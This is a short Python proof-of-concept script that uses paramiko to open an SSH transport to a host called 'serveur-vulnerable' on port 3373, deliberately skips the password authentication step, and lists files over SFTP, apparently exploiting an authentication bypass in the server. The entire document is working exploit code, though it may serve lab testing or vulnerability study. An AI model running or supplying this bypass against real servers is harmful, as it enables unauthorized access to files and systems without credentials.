import paramiko

host = 'serveur-vulnerable'
port = 3373


trans = paramiko.Transport((host, port))
trans.start_client()

# If the call below is skipped, no username or password is required.
#trans.auth_password('username', 'password')

sftp = paramiko.SFTPClient.from_transport(trans)
print(sftp.listdir('.'))
sftp.close()
